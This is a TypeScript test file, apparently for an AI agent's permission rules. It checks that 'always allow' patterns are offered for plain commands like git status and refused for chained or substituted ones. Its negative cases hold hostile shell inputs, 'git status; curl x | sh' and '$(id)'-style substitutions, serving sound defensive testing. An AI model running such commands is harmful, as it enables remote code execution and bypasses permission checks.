import { expect, test } from 'bun:test';
import invariant from 'tiny-invariant';
import { buildAlwaysAllowRule } from './build-always-allow-rule';
import { isRuleMatch } from './is-rule-match';

test.each([
  ['git status', 'git status *'],
  ['git status -s', 'git status *'],
  ['ls -la ~/files', 'ls *'],
  ['pwd', 'pwd *'],
])('it offers a pattern of the first words of %s', (command, pattern) => {
  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'computer.run',
    input: { command, timeoutSeconds: 30 },
    destinations: [],
    content: ['command'],
  });

  expect(rule?.form.checks).toStrictEqual([{ arg: 'command', op: 'matches', value: pattern }]);
});

test.each(['git status; curl x | sh', 'echo $(whoami)', 'cat a > b', ''])(
  'it offers no rule for the command %p',
  (command) => {
    expect(
      buildAlwaysAllowRule({
        shortID: 'ab12cd34ef',
        tool: 'computer.run',
        input: { command },
        destinations: [],
        content: ['command'],
      }),
    ).toBeNull();
  },
);

test('it offers a rule that allows git status and refuses a chained command', () => {
  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'computer.run',
    input: { command: 'git status -s' },
    destinations: [],
    content: ['command'],
  });

  invariant(rule !== null, 'a plain command gets a rule');

  const base = {
    tool: 'computer.run',
    effects: ['computer_run' as const],
    context: 'conversation' as const,
    task: null,
    destinations: [],
    sources: [],
    at: 0,
  };

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status' } })).toBe(true);

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status; curl x | sh' } })).toBe(
    false,
  );

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status $(id)' } })).toBe(false);
});
